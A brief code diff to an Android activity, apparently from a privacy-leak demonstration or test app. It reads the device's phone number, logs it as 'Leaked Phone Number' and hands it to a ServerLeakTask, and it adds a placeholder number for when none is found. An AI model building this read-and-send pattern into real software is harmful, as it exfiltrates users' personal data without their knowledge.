@@ -193,6 +193,10 @@ public class Main extends AppCompatActivity {
             phoneNumber = telephonyManager.getLine1Number();
         }
 
+        if(phoneNumber == null){
+            phoneNumber = "555-1234";
+        }
+
         prependToLog("Leaked Phone Number: " + phoneNumber);
 
         ServerLeakTask slt = new ServerLeakTask();
